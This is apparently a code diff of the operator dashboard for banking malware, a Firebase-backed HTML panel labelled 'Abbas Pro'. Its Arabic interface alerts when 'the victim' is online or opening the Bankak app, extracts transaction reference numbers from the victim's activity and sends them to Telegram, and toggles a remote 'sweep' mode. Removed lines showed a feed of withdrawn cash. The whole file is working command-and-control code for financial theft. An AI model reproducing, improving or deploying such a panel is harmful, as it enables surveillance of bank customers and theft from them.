@@ -3,20 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Abbas Pro - Full Control</title>
+    <title>Abbas Pro - Security Fixed</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --main-blue: #003366; --gold: #d4af37; --bg: #f4f7f6; }
+        :root { --main: #003366; --gold: #d4af37; --bg: #f4f7f6; }
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); margin: 0; padding: 10px; }
-        .card { background: white; max-width: 450px; margin: auto; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border-top: 6px solid var(--main-blue); }
-        .header { background: var(--main-blue); color: white; padding: 20px; text-align: center; }
+        .card { background: white; max-width: 450px; margin: auto; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border-top: 6px solid var(--main); }
+        .header { background: var(--main); color: white; padding: 20px; text-align: center; }
         .content { padding: 20px; }
         .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px; transition: 0.3s; }
         .btn-on { background: #27ae60; color: white; }
         .btn-off { background: #e74c3c; color: white; }
         .btn-turbo { background: var(--gold); color: white; border: 2px solid #b8962e; }
-        .section { background: #f9f9f9; border-radius: 12px; padding: 12px; margin-top: 15px; border-right: 4px solid var(--main-blue); }
+        .section { background: #f9f9f9; border-radius: 12px; padding: 12px; margin-top: 15px; border-right: 4px solid var(--main); }
         .trans-id { color: #d35400; font-weight: bold; font-family: monospace; background: #fff3e0; padding: 2px 5px; border-radius: 4px; border: 1px solid #ffcc80; }
         .footer { text-align: center; padding: 15px; font-size: 12px; color: #888; background: #eee; }
     </style>
@@ -25,30 +25,24 @@
 
 <div class="card">
     <div class="header">
-        <h2 style="margin:0;">نظام عباس الدولي + Telegram</h2>
-        <p style="font-size:11px; opacity:0.8;">التحكم الكامل والاشعارات الفورية</p>
+        <h2 style="margin:0;">نظام عباس الدولي v2.0</h2>
+        <p style="font-size:11px; opacity:0.8;">تم تحديث الحماية وتفعيل التليجرام</p>
     </div>
 
     <div class="content">
         <div id="stat" style="text-align:center; font-weight:bold; margin-bottom:15px; color:#333;">جاري فحص الاتصال...</div>
         
         <button id="mainBtn" class="btn" onclick="toggleStatus()">تحميل...</button>
-        
-        <button id="turboBtn" class="btn btn-turbo" onclick="toggleTurbo()">الوضع الخارق: جاري التحميل...</button>
+        <button id="turboBtn" class="btn btn-turbo" onclick="toggleTurbo()">الوضع الخارق: تحميل...</button>
 
         <div class="section" style="border-right-color: #d35400;">
-            <strong style="color:#d35400">أرقام العمليات المستخرجة (Ref ID):</strong>
-            <div id="extractedTrans" style="font-size:13px; margin-top:5px;">لا توجد عمليات حالياً</div>
+            <strong style="color:#d35400">آخر رقم مرجعي (Ref ID):</strong>
+            <div id="extractedTrans" style="font-size:13px; margin-top:5px;">في انتظار أول عملية...</div>
         </div>
 
         <div class="section">
-            <strong style="color:var(--main-blue)">سجل الأنشطة المباشر:</strong>
+            <strong style="color:var(--main)">سجل الأنشطة الحية:</strong>
             <div id="logs" style="font-size:13px; margin-top:5px;"></div>
-        </div>
-
-        <div class="section" style="border-right-color: var(--gold);">
-            <strong style="color:var(--gold)">المبالغ المسحوبة (Cash):</strong>
-            <div id="cash" style="font-size:13px; margin-top:5px;"></div>
         </div>
     </div>
 
@@ -75,54 +69,42 @@
     const db = firebase.database();
     let status = false, turbo = false;
 
-    // مراقبة حالة النظام
+    // رسالة اختبار عند فتح اللوحة لأول مرة
+    console.log("System Started");
+
     db.ref('control/status').on('value', snap => {
         status = snap.val() === "true" || snap.val() === true;
-        document.getElementById('stat').innerText = "النظام الآن: " + (status ? "نشط" : "متوقف");
+        document.getElementById('stat').innerText = "النظام: " + (status ? "نشط" : "متوقف");
         const b = document.getElementById('mainBtn');
-        b.innerText = status ? "إيقاف النظام" : "تفعيل النظام";
+        b.innerText = status ? "إيقاف الكسح" : "تفعيل الكسح";
         b.className = "btn " + (status ? "btn-off" : "btn-on");
     });
 
-    // مراقبة وضع السرعة (Turbo) مع الأيقونات المطلوبة
     db.ref('control/turbo').on('value', snap => {
         turbo = snap.val() === "true" || snap.val() === true;
-        const tb = document.getElementById('turboBtn');
-        tb.innerText = "الوضع الخارق: " + (turbo ? "مـفـعـل ✅" : "مـعـطل ❌");
+        document.getElementById('turboBtn').innerText = "الوضع الخارق: " + (turbo ? "مـفـعـل ✅" : "مـعـطل ❌");
     });
 
     function toggleStatus() { db.ref('control/status').set(status ? "false" : "true"); }
     function toggleTurbo() { db.ref('control/turbo').set(turbo ? "false" : "true"); }
 
-    // معالجة البيانات وإرسال التنبيهات
     db.ref('MyActivities').limitToLast(1).on('child_added', snap => {
         const msg = snap.val();
-        
-        // إرسال تنبيه للتليجرام عند فتح بنكك
-        if(msg.includes("فتح") || msg.includes("دخول") || msg.includes("Bankak")) {
-            sendTele("🚨 تنبيه: الضحية دخل الآن لتطبيق بنكك!");
+        if(msg.includes("فتح") || msg.includes("دخول")) {
+            sendTele("🚨 تنبيه: الضحية متصل الآن!");
         }
-
-        // استخراج رقم العملية تلقائياً
         const match = msg.match(/\d{10,}/); 
         if (match) {
-            sendTele("✅ تم سحب رقم عملية جديد: " + match[0]);
+            sendTele("✅ رقم عملية جديد: " + match[0]);
             document.getElementById('extractedTrans').innerHTML = `<div>🔢 ID: <span class="trans-id">${match[0]}</span></div>`;
         }
     });
 
-    // عرض السجلات في اللوحة
     db.ref('MyActivities').limitToLast(5).on('value', snap => {
         const d = document.getElementById('logs'); d.innerHTML = "";
         const data = []; snap.forEach(c => { data.push(c.val()); });
         data.reverse().forEach(m => { d.innerHTML += `<div>• ${m}</div>`; });
     });
-
-    db.ref('Cash').limitToLast(3).on('value', snap => {
-        const d = document.getElementById('cash'); d.innerHTML = "";
-        snap.forEach(c => { d.innerHTML += `<div style="color:green; font-weight:bold;">💰 تم سحب: ${c.val()}</div>`; });
-    });
 </script>
-
 </body>
 </html>
